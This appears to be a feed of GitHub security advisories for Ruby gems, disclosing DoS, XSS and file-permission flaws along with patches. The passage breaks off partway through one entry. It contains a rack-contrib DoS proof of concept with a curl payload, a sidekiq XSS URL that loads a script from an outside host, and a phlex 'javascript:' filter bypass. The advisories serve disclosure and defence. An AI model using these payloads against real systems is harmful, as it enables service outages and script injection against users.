{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Ruby gems hosted at RubyGems.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/rubygems.json",
    "description": "Security Advisory for Ruby gems hosted at RubyGems.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The next ruby code is vulnerable to denial of service due to the fact that the user controlled data <code>profiler_runs</code> was not contrained to any limitation. Which would lead to allocating resources on the server side with no limitation (CWE-770).</p>\n<pre><code class=\"language-ruby\">        runs = (request.params['profiler_runs'] || @times).to_i\n        result = @profile.profile do\n          runs.times { @app.call(env) }\n        end\n</code></pre>\n<p>An exploit as such <code>curl --fail \"http://127.0.0.1:9292/?profiler_runs=9999999999&amp;profile=process_time\"</code> may cause resource exhaution by a remotely controlled value.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Herein the <code>config.ru</code> file: </p>\n<pre><code class=\"language-ruby\">require 'rack'\nrequire 'rack/contrib'\n\nuse Rack::Profiler # if ENV['RACK_ENV'] == 'development'\n\n# Define a Rack application\napp = lambda do |env|\n  # Your application logic goes here\n  [200, {}, [\"Hello World\"]]\nend\n\n# Run the Rack application\nrun app\n</code></pre>\n<p>A Dockerfile:</p>\n<pre><code class=\"language-Dockerfile\"># Use the official Ruby image as a base\nFROM ruby:latest\n\n# Set the working directory inside the container\nWORKDIR /app\n\n# Copy the custom config.ru file into the container\nCOPY config.ru .\nCOPY Gemfile .\n\n# Install rack and the gems needed to run the app\nRUN bundle install\n\n# Expose the port that rackup will listen on\nEXPOSE 9292\n\n# Run rackup when the container starts\nENTRYPOINT [\"rackup\",\"--host\",\"0.0.0.0\",\"--port\",\"9292\"]\n\n# Health check\nHEALTHCHECK --interval=3s --timeout=10s --start-period=2s --retries=3 CMD curl --fail http://localhost:9292/ || exit 1\n</code></pre>\n<p>A Gemfile </p>\n<pre><code>source 'https://rubygems.org'\n\ngem 'rack', '~&gt; 2.0'\ngem 'rack-contrib', '~&gt; 2.4'\ngem 'rackup'\ngem 'ruby-prof'\n</code></pre>\n<p>A Docker compose</p>\n<pre><code class=\"language-Dockerfile\">services:\n  app:\n    build:\n      context: .\n    ports:\n      - \"9292:9292\"\n</code></pre>\n<p>To run the PoC </p>\n<pre><code class=\"language-bash\">docker compose up --build\n</code></pre>\n<p>To exploit DoS: </p>\n<pre><code class=\"language-bash\">curl  \"http://127.0.0.1:9292/?profiler_runs=9999999999&amp;profile=process_time\"\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>Potential denial of service by remotely user-controlled data.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rack/rack-contrib/security/advisories/GHSA-8c8q-2xw3-j869\">https://github.com/rack/rack-contrib/security/advisories/GHSA-8c8q-2xw3-j869</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35231\">https://nvd.nist.gov/vuln/detail/CVE-2024-35231</a></li>\n<li><a href=\"https://github.com/rack/rack-contrib/commit/0eec2a9836329051c6742549e65a94a4c24fe6f7\">https://github.com/rack/rack-contrib/commit/0eec2a9836329051c6742549e65a94a4c24fe6f7</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack-contrib/CVE-2024-35231.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack-contrib/CVE-2024-35231.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8c8q-2xw3-j869\">https://github.com/advisories/GHSA-8c8q-2xw3-j869</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8c8q-2xw3-j869",
            "title": "[rack-contrib] rack-contrib vulnerable to Denial of Service due to the unconstrained value of the incoming \"profiler_runs\" parameter",
            "date_modified": "2024-05-31T20:42:29.000Z",
            "date_published": "2024-05-28T15:48:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8c8q-2xw3-j869"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A moderate severity security vulnerability has been identified in the Kaminari pagination library for Ruby on Rails, concerning insecure file permissions. This advisory outlines the vulnerability, affected versions, and provides guidance for mitigation.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is of moderate severity due to the potential for unauthorized write access to particular Ruby files managed by the library. Such access could lead to the alteration of application behavior or data integrity issues.</p>\n<h3 id=\"resolution\">Resolution</h3>\n<p>Those who use the <code>gem install</code> command, such as <code>gem install kaminari -v 0.16.1</code>, <code>gem unpack kaminari -v 0.16.1</code>, or <code>bundle install</code> to download the package would <strong><em>not</em></strong> be affected and no action is required. </p>\n<p>Those who manually download and decompressing the affected versions are advised to update to 0.16.2 or later version of Kaminari where file permissions have been adjusted to enhance security.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If upgrading is not feasible immediately, manually adjusting the file permissions on the server to <code>644</code> to restrict access is a viable interim measure.</p>\n<h4 id=\"all-affected-versions\">All Affected Versions:</h4>\n<pre><code>lib/kaminari/models/page_scope_methods.rb\n</code></pre>\n<p>In addition to the previously mentioned files, security tools like AWS Inspector might also identify other files as unsafe. These files, although not loaded or used at runtime, may still be flagged. To avoid any potential confusion in your logs and ensure system integrity, we recommend updating the permissions for these files as well. This proactive measure helps maintain a clean security posture and minimizes unnecessary alerts.</p>\n<h4 id=\"version-0150-and-0151\">Version 0.15.0 and 0.15.1:</h4>\n<pre><code>spec/models/mongo_mapper/mongo_mapper_spec.rb\n</code></pre>\n<h4 id=\"version-0160\">Version 0.16.0:</h4>\n<pre><code>spec/models/mongo_mapper/mongo_mapper_spec.rb\nspec/models/mongoid/mongoid_spec.rb\n</code></pre>\n<h4 id=\"version-0161\">Version 0.16.1:</h4>\n<pre><code>spec/models/active_record/scopes_spec.rb\nspec/models/mongo_mapper/mongo_mapper_spec.rb\nspec/models/mongoid/mongoid_spec.rb\ngemfiles/data_mapper_12.gemfile\ngemfiles/active_record_32.gemfile\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>Official Kaminari repository link (this page)</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>We thank <a href=\"https://github.com/G-Rath\">Gareth Jones</a> for discovering and reporting this issue. Their diligent work is instrumental in our ongoing efforts to maintain and improve software security.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kaminari/kaminari/security/advisories/GHSA-7r3j-qmr4-jfpj\">https://github.com/kaminari/kaminari/security/advisories/GHSA-7r3j-qmr4-jfpj</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32978\">https://nvd.nist.gov/vuln/detail/CVE-2024-32978</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/kaminari/CVE-2024-32978.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/kaminari/CVE-2024-32978.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7r3j-qmr4-jfpj\">https://github.com/advisories/GHSA-7r3j-qmr4-jfpj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7r3j-qmr4-jfpj",
            "title": "[kaminari] Kaminari Insecure File Permissions Vulnerability",
            "date_modified": "2024-05-31T20:33:46.000Z",
            "date_published": "2024-05-28T15:47:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7r3j-qmr4-jfpj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The REXML gem before 3.2.6 has a DoS vulnerability when it parses an XML that has many <code>&lt;</code>s in an attribute value.</p>\n<p>If you need to parse untrusted XMLs, you many be impacted to this vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The REXML gem 3.2.7 or later include the patch to fix this vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Don't parse untrusted XMLs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176/\">https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/rexml/security/advisories/GHSA-vg3r-rm7w-2xgh\">https://github.com/ruby/rexml/security/advisories/GHSA-vg3r-rm7w-2xgh</a></li>\n<li><a href=\"https://github.com/ruby/rexml/commit/4325835f92f3f142ebd91a3fdba4e1f1ab7f1cfb\">https://github.com/ruby/rexml/commit/4325835f92f3f142ebd91a3fdba4e1f1ab7f1cfb</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176\">https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35176\">https://nvd.nist.gov/vuln/detail/CVE-2024-35176</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vg3r-rm7w-2xgh\">https://github.com/advisories/GHSA-vg3r-rm7w-2xgh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vg3r-rm7w-2xgh",
            "title": "[rexml] REXML contains a denial of service vulnerability",
            "date_modified": "2024-05-16T19:05:52.000Z",
            "date_published": "2024-05-16T17:44:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vg3r-rm7w-2xgh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-r95h-9x8f-r3f7. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<h2 id=\"summary\">Summary</h2>\n<p>Nokogiri v1.16.5 upgrades its dependency libxml2 to\n<a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.12.7\">2.12.7</a> from 2.12.6.</p>\n<p>libxml2 v2.12.7 addresses CVE-2024-34459:</p>\n<ul>\n<li>described at <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/720\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>\n<li>patched by <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53\">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>There is no impact to Nokogiri users because the issue is present only\nin libxml2's <code>xmllint</code> tool which Nokogiri does not provide or expose.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-05-13 05:57 EDT, libxml2 2.12.7 release is announced</li>\n<li>2024-05-13 08:30 EDT, nokogiri maintainers begin triage</li>\n<li>2024-05-13 10:05 EDT, nokogiri <a href=\"https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5\">v1.16.5 is released</a>\nand this GHSA made public</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7\">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml</a></li>\n<li><a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/720\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r3w4-36x6-7r99\">https://github.com/advisories/GHSA-r3w4-36x6-7r99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r3w4-36x6-7r99",
            "title": "[nokogiri] Duplicate Advisory: Nokogiri updates packaged libxml2 to v2.12.7 to resolve CVE-2024-34459",
            "date_modified": "2024-05-16T17:53:38.000Z",
            "date_published": "2024-05-14T22:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r3w4-36x6-7r99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>Nokogiri v1.16.5 upgrades its dependency libxml2 to <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.12.7\">2.12.7</a> from 2.12.6.</p>\n<p>libxml2 v2.12.7 addresses CVE-2024-34459:</p>\n<ul>\n<li>described at <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/720\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>\n<li>patched by <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53\">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>There is no impact to Nokogiri users because the issue is present only in libxml2's <code>xmllint</code> tool which Nokogiri does not provide or expose.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-05-13 05:57 EDT, libxml2 2.12.7 release is announced</li>\n<li>2024-05-13 08:30 EDT, nokogiri maintainers begin triage</li>\n<li>2024-05-13 10:05 EDT, nokogiri <a href=\"https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5\">v1.16.5 is released</a> and this GHSA made public</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7\">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7</a></li>\n<li><a href=\"https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5\">https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5</a></li>\n<li><a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53\">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>\n<li><a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/720\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r95h-9x8f-r3f7\">https://github.com/advisories/GHSA-r95h-9x8f-r3f7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r95h-9x8f-r3f7",
            "title": "[nokogiri] Nokogiri updates packaged libxml2 to v2.12.7 to resolve CVE-2024-34459",
            "date_modified": "2024-05-16T17:45:01.000Z",
            "date_published": "2024-05-13T16:05:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r95h-9x8f-r3f7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>The reason these issues were not detected before is the escapes were working as designed. However, their design didn't take into account just how recklessly permissive browser are when it comes to executing unsafe JavaScript via HTML attributes.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<p>If you splat user-provided attributes when rendering any HTML or SVG tag, malicious event attributes could be included in the output, executing JavaScript when the events are triggered by another user.</p>\n<pre><code class=\"language-ruby\">h1(**JSON.parse(user_attributes))\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Patches are <a href=\"https://rubygems.org/gems/phlex\">available on RubyGems</a> for all minor versions released in the last year.</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.2\">1.10.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.3\">1.9.3</a></li>\n</ul>\n<p>If you are on <code>main</code>, it has been patched since <a href=\"https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2\"><code>da8f943</code></a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<p>In addition to upgrading to a patched version of Phlex, we strongly recommend configuring a Content Security Policy header that does not allow <code>unsafe-inline</code>. Here’s how you can configure a Content Security Policy header in Rails. <a href=\"https://guides.rubyonrails.org/security.html#content-security-policy-header\">https://guides.rubyonrails.org/security.html#content-security-policy-header</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32970\">https://nvd.nist.gov/vuln/detail/CVE-2024-32970</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2\">https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/payloadbox/xss-payload-list\">https://github.com/payloadbox/xss-payload-list</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex\">https://rubygems.org/gems/phlex</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.2\">https://rubygems.org/gems/phlex/versions/1.10.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.3\">https://rubygems.org/gems/phlex/versions/1.9.3</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9p57-h987-4vgx\">https://github.com/advisories/GHSA-9p57-h987-4vgx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9p57-h987-4vgx",
            "title": "[phlex] Phlex vulnerable to Cross-site Scripting (XSS) via maliciously formed HTML attribute names and values",
            "date_modified": "2024-05-03T20:17:03.000Z",
            "date_published": "2024-05-01T16:37:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9p57-h987-4vgx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>The reason these issues were not detected before is the escapes were working as designed. However, their design didn't take into account just how recklessly permissive browser are when it comes to executing unsafe JavaScript via HTML attributes.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<p>If you splat user-provided attributes when rendering any HTML or SVG tag, malicious event attributes could be included in the output, executing JavaScript when the events are triggered by another user.</p>\n<pre><code class=\"language-ruby\">h1(**JSON.parse(user_attributes))\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Patches are <a href=\"https://rubygems.org/gems/phlex\">available on RubyGems</a> for all minor versions released in the last year.</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.2\">1.10.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.3\">1.9.3</a></li>\n</ul>\n<p>If you are on <code>main</code>, it has been patched since <a href=\"https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2\"><code>da8f943</code></a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Configuring a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">Content Security Policy</a> that does not allow <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>\n<h3 id=\"references\">References</h3>\n<p>In addition to upgrading to a patched version of Phlex, we strongly recommend configuring a Content Security Policy header that does not allow <code>unsafe-inline</code>. Here’s how you can configure a Content Security Policy header in Rails. <a href=\"https://guides.rubyonrails.org/security.html#content-security-policy-header\">https://guides.rubyonrails.org/security.html#content-security-policy-header</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx\">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32970\">https://nvd.nist.gov/vuln/detail/CVE-2024-32970</a></li>\n<li><a href=\"https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2\">https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>\n<li><a href=\"https://github.com/payloadbox/xss-payload-list\">https://github.com/payloadbox/xss-payload-list</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex\">https://rubygems.org/gems/phlex</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.2\">https://rubygems.org/gems/phlex/versions/1.10.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.3\">https://rubygems.org/gems/phlex/versions/1.9.3</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9p57-h987-4vgx\">https://github.com/advisories/GHSA-9p57-h987-4vgx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9p57-h987-4vgx",
            "title": "[phlex] Phlex vulnerable to Cross-site Scripting (XSS) via maliciously formed HTML attribute names and values",
            "date_modified": "2024-05-03T20:17:03.000Z",
            "date_published": "2024-05-01T16:37:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9p57-h987-4vgx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>sidekiq from 7.0.4 to 7.0.7 is vulnerable to reflected cross-site scripting. A fix was released in version 7.0.8.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1892\">https://nvd.nist.gov/vuln/detail/CVE-2023-1892</a></li>\n<li><a href=\"https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214\">https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214</a></li>\n<li><a href=\"https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777\">https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777</a></li>\n<li><a href=\"https://github.com/sidekiq/sidekiq/blob/main/Changes.md#708\">https://github.com/sidekiq/sidekiq/blob/main/Changes.md#708</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2023-1892.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2023-1892.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h3r8-h5qw-4r35\">https://github.com/advisories/GHSA-h3r8-h5qw-4r35</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h3r8-h5qw-4r35",
            "title": "[sidekiq] sidekiq vulnerable to cross-site scripting ",
            "date_modified": "2024-05-01T13:15:10.000Z",
            "date_published": "2023-04-21T06:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h3r8-h5qw-4r35"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"description\">Description:</h3>\n<p>During the source Code Review of the metrics.erb view of the Sidekiq Web UI, A reflected XSS vulnerability is discovered. The value of substr parameter is reflected in the response without any encoding, allowing an attacker to inject Javascript code into the response of the application. </p>\n<p>This vulnerability can be exploited to target the users of the application, and users of other applications deployed on the same domain or website as that of the Sidekiq website. Successful exploit results may result in compromise of user accounts and user data.</p>\n<h3 id=\"impact\">Impact:</h3>\n<p>The impact of this vulnerability can be severe. An attacker could exploit it to target users of the Sidekiq Web UI. Moreover, if other applications are deployed on the same domain or website as Sidekiq, users of those applications could also be affected, leading to a broader scope of compromise. Potentially compromising their accounts, forcing the users to perform sensitive actions, stealing sensitive data, performing CORS attacks, defacement of the web application, etc.</p>\n<h3 id=\"mitigation\">Mitigation:</h3>\n<p>Encode all output data before rendering it in the response to prevent XSS attacks.</p>\n<h3 id=\"steps-to-reproduce\">Steps to Reproduce:</h3>\n<ol>\n<li>Go to the following URL of the sidekiq Web UI: \nhttps://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22<a href=\"https://cheemahq.vercel.app/a.js%22%20/%3E\">https://cheemahq.vercel.app/a.js%22%20/%3E</a></li>\n<li>XSS payload will be executed, causing a popup.</li>\n</ol>\n<h3 id=\"evidence\">Evidence:</h3>\n<p><img alt=\"image\" src=\"https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e\">\nFigure 1: Source Code Vulnerable to XSS</p>\n<p><img alt=\"image\" src=\"https://github.com/sidekiq/sidekiq/assets/59286712/7a801feb-d495-416e-8e0e-36dee0eadf85\">\nFigure 2: XSS payload triggered</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq\">https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32887\">https://nvd.nist.gov/vuln/detail/CVE-2024-32887</a></li>\n<li><a href=\"https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d\">https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d</a></li>\n<li><a href=\"https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4\">https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2024-32887.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2024-32887.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q655-3pj8-9fxq\">https://github.com/advisories/GHSA-q655-3pj8-9fxq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q655-3pj8-9fxq",
            "title": "[sidekiq] Sidekiq vulnerable to a Reflected XSS in Queues Web Page",
            "date_modified": "2024-05-01T13:02:19.000Z",
            "date_published": "2024-04-26T22:19:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q655-3pj8-9fxq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>\n<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\\t</code> or newline <code>\\n</code> characters between the characters of the protocol, e.g. <code>java\\tscript:</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>\n<pre><code class=\"language-ruby\">a(href: user_profile) { \"Profile\" }\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>\n<ul>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.10.1\">1.10.1</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.9.2\">1.9.2</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.8.3\">1.8.3</a></li>\n<li><a href=\"https://rubygems.org/gems/phlex/versions/1.7.2\">1.7.2</a></li>\n<li><a 